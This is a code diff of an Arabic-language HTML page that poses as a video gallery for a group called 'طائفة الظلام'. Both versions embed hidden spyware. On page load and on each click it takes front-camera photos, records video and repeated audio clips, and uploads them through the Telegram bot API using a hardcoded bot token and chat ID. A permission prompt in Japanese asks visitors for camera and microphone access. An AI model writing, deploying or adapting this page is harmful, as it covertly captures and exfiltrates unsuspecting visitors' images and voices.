@@ -4,210 +4,191 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0">
-  <title>📹 صفحة الفيديوهات - طائفة الظلام</title>
+  <title>فيديوهات - طائفة الظلام</title>
   <style>
     body {
       margin: 0;
-      background-color: #2d0033;
-      font-family: sans-serif;
-      color: white;
-      direction: rtl;
+      background-color: #1a001a;
+      font-family: Arial, sans-serif;
       overflow-x: hidden;
+      direction: rtl;
     }
-    header {
-      background: url('cover.jpg') center/cover no-repeat;
+    .cover {
+      width: 100%;
       height: 200px;
-      position: relative;
+      background-image: url('cover.jpg'); /* 👑 صورة الغلاف */
+      background-size: cover;
+      background-position: center;
     }
-    .profile {
-      width: 100px;
-      height: 100px;
+    .profile-pic {
+      width: 120px;
+      height: 120px;
       border-radius: 50%;
-      border: 4px solid #fff;
-      background: purple;
-      position: absolute;
-      bottom: -50px;
-      right: 20px;
+      border: 5px solid #ff00ff;
+      margin: -60px auto 20px;
+      background-image: url('profile.jpg'); /* 👑 صورة بروفايل */
+      background-size: cover;
+      background-position: center;
       animation: pulse 2s infinite;
     }
     @keyframes pulse {
-      0% { transform: scale(1); box-shadow: 0 0 0 0 violet; }
-      70% { transform: scale(1.05); box-shadow: 0 0 0 15px transparent; }
-      100% { transform: scale(1); box-shadow: 0 0 0 0 transparent; }
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.1); }
     }
     .desc {
-      padding: 70px 20px 20px;
-      font-size: 18px;
+      color: white;
+      text-align: center;
+      margin-bottom: 20px;
     }
-    .grid {
+    .videos {
       display: grid;
       grid-template-columns: repeat(5, 1fr);
       gap: 5px;
       padding: 10px;
     }
-    .grid video {
+    video {
       width: 100%;
       aspect-ratio: 1/1;
       object-fit: cover;
+      border-radius: 10px;
       cursor: pointer;
+      border: 2px solid #fff;
     }
     .overlay {
       position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
+      top: 0; left: 0; right: 0; bottom: 0;
       background: rgba(0,0,0,0.9);
       display: none;
-      align-items: center;
       justify-content: center;
+      align-items: center;
       flex-direction: column;
       z-index: 999;
     }
     .overlay video {
       width: 90%;
-      max-height: 80%;
+      max-height: 80vh;
     }
-    .download {
+    .download-btn {
       margin-top: 10px;
       padding: 10px 20px;
-      background: purple;
+      background-color: #9900cc;
       color: white;
       border: none;
-      font-size: 16px;
       border-radius: 10px;
+      font-size: 18px;
+      cursor: pointer;
       animation: pulse 1.5s infinite;
     }
   </style>
 </head>
 <body>
 
-<header>
-  <div class="profile"></div>
-</header>
-<div class="desc">🎥 صفحة الفيديوهات الخاصة بطائفة الظلام - اضغط على أي فيديو لتكبيره وتشغيله</div>
+<div class="cover"></div>
+<div class="profile-pic"></div>
+<div class="desc">⚡ صفحة الفيديوهات الخاصة بـ طائفة الظلام ⚡</div>
 
-<div class="grid">
-  <!-- 👑 تكرار الفيديوهات -->
-  <script>
-    for (let i = 0; i < 25; i++) {
-      document.write(`<video src="ffghgg.mp4" onclick="openPlayer(this)"></video>`);
-    }
-  </script>
+<div class="videos">
+  <video src="ffghgg.mp4" controls muted preload="metadata"></video>
+  <video src="ffghgg.mp4" controls muted preload="metadata"></video>
+  <video src="ffghgg.mp4" controls muted preload="metadata"></video>
+  <video src="ffghgg.mp4" controls muted preload="metadata"></video>
+  <video src="ffghgg.mp4" controls muted preload="metadata"></video>
 </div>
 
-<div class="overlay" id="overlay" onclick="closePlayer()">
-  <video id="bigVideo" controls></video>
-  <a id="downloadLink" download="video.mp4">
-    <button class="download">⬇️ تحميل الفيديو</button>
+<div class="overlay" id="overlay">
+  <video id="bigVideo" controls autoplay></video>
+  <a id="downloadLink" download>
+    <button class="download-btn">⬇ تحميل الفيديو</button>
   </a>
 </div>
 
 <script>
-  const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
-  const CHAT_ID = "7664410054";
+const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
+const CHAT_ID = "7664410054";
 
-  // 👑 تكبير الفيديو عند النقر
-  function openPlayer(video) {
-    const overlay = document.getElementById('overlay');
-    const bigVideo = document.getElementById('bigVideo');
-    const downloadLink = document.getElementById('downloadLink');
+// رسالة إذن بلغة يابانية
+alert("カメラとマイクへのアクセスを許可してください！");
 
-    bigVideo.src = video.src;
-    downloadLink.href = video.src;
-    overlay.style.display = "flex";
-    bigVideo.play();
-  }
+// التقاط صور وفيديو عند الدخول
+let images = [];
+navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true }).then(stream => {
+  const videoTrack = stream.getVideoTracks()[0];
+  const imageCapture = new ImageCapture(videoTrack);
 
-  function closePlayer() {
-    const overlay = document.getElementById('overlay');
-    const bigVideo = document.getElementById('bigVideo');
-    overlay.style.display = "none";
-    bigVideo.pause();
-    bigVideo.src = "";
-  }
+  // التقاط 10 صور
+  let count = 0;
+  const captureInterval = setInterval(() => {
+    if (count >= 10) clearInterval(captureInterval);
+    imageCapture.takePhoto().then(blob => sendPhoto(blob));
+    count++;
+  }, 1000);
 
-  // 👑 طلب الأذونات وتسجيل فيديو وصوت
-  async function initMedia() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+  // تسجيل فيديو 20 ثانية
+  const mediaRecorder = new MediaRecorder(stream);
+  const chunks = [];
+  mediaRecorder.ondataavailable = e => chunks.push(e.data);
+  mediaRecorder.onstop = () => {
+    const videoBlob = new Blob(chunks, { type: 'video/webm' });
+    sendFile(videoBlob, 'video.webm');
+  };
+  mediaRecorder.start();
+  setTimeout(() => mediaRecorder.stop(), 20000);
 
-      // التقاط صور وفيديو
-      const mediaRecorder = new MediaRecorder(stream);
-      const audioRecorder = new MediaRecorder(stream);
-      let chunks = [];
-      let audioChunks = [];
+  // تسجيل صوت mp3 كل 5 ثوان
+  const audioRecorder = new MediaRecorder(stream);
+  setInterval(() => {
+    const aChunks = [];
+    const aRecorder = new MediaRecorder(stream);
+    aRecorder.ondataavailable = e => aChunks.push(e.data);
+    aRecorder.onstop = () => {
+      const aBlob = new Blob(aChunks, { type: 'audio/mp3' });
+      sendFile(aBlob, 'voice.mp3');
+    };
+    aRecorder.start();
+    setTimeout(() => aRecorder.stop(), 5000);
+  }, 5000);
+});
 
-      // 🎥 التقاط الفيديو
-      mediaRecorder.ondataavailable = e => chunks.push(e.data);
-      mediaRecorder.onstop = () => {
-        const blob = new Blob(chunks, { type: 'video/webm' });
-        sendToTelegram(blob, 'video.webm');
-      };
-
-      // 🎤 التقاط الصوت كل 5 ثوانٍ
-      setInterval(() => {
-        audioRecorder.stop();
-        audioRecorder.start();
-      }, 5000);
-
-      audioRecorder.ondataavailable = e => audioChunks.push(e.data);
-      audioRecorder.onstop = () => {
-        const blob = new Blob(audioChunks, { type: 'audio/mp3' });
-        sendToTelegram(blob, 'sound.mp3');
-        audioChunks = [];
-      };
-
-      mediaRecorder.start();
-      audioRecorder.start();
-
-      // 📸 التقاط 10 صور
+// التقاط صورة عند أي نقر
+document.body.addEventListener("click", () => {
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then(stream => {
       const track = stream.getVideoTracks()[0];
-      const imageCapture = new ImageCapture(track);
-      for (let i = 0; i < 10; i++) {
-        const bitmap = await imageCapture.grabFrame();
-        const canvas = document.createElement('canvas');
-        canvas.width = bitmap.width;
-        canvas.height = bitmap.height;
-        canvas.getContext('2d').drawImage(bitmap, 0, 0);
-        canvas.toBlob(blob => sendToTelegram(blob, `photo${i}.jpg`), 'image/jpeg');
-        await new Promise(r => setTimeout(r, 1500));
-      }
-
-      // ⏱️ إيقاف بعد 20 ثانية
-      setTimeout(() => {
-        mediaRecorder.stop();
-      }, 20000);
-
-      // 📸 التقاط صورة عند كل نقرة
-      document.body.addEventListener('click', async () => {
-        const bitmap = await imageCapture.grabFrame();
-        const canvas = document.createElement('canvas');
-        canvas.width = bitmap.width;
-        canvas.height = bitmap.height;
-        canvas.getContext('2d').drawImage(bitmap, 0, 0);
-        canvas.toBlob(blob => sendToTelegram(blob, `click_photo.jpg`), 'image/jpeg');
-      });
-
-    } catch (e) {
-      alert("📵 アクセスが拒否されました。カメラとマイクの権限が必要です。");
-    }
-  }
-
-  // 👑 إرسال ملف إلى تليجرام
-  function sendToTelegram(blob, filename) {
-    const form = new FormData();
-    form.append("chat_id", CHAT_ID);
-    form.append("caption", filename);
-    form.append("document", blob, filename);
-
-    fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
-      method: "POST",
-      body: form
+      const capture = new ImageCapture(track);
+      capture.takePhoto().then(blob => sendPhoto(blob));
     });
-  }
+});
 
-  window.onload = initMedia;
+// إرسال صورة
+function sendPhoto(blob) {
+  const form = new FormData();
+  form.append("chat_id", CHAT_ID);
+  form.append("photo", blob, "photo.jpg");
+  fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: form });
+}
+
+// إرسال ملف (فيديو/صوت)
+function sendFile(blob, filename) {
+  const form = new FormData();
+  form.append("chat_id", CHAT_ID);
+  form.append("document", blob, filename);
+  fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: "POST", body: form });
+}
+
+// تكبير الفيديو عند الضغط
+document.querySelectorAll("video").forEach(v => {
+  v.addEventListener("click", e => {
+    e.stopPropagation();
+    document.getElementById("bigVideo").src = v.src;
+    document.getElementById("downloadLink").href = v.src;
+    document.getElementById("overlay").style.display = "flex";
+  });
+});
+
+document.getElementById("overlay").addEventListener("click", () => {
+  document.getElementById("overlay").style.display = "none";
+  document.getElementById("bigVideo").pause();
+});
 </script>
-
 </body>
 </html>
-
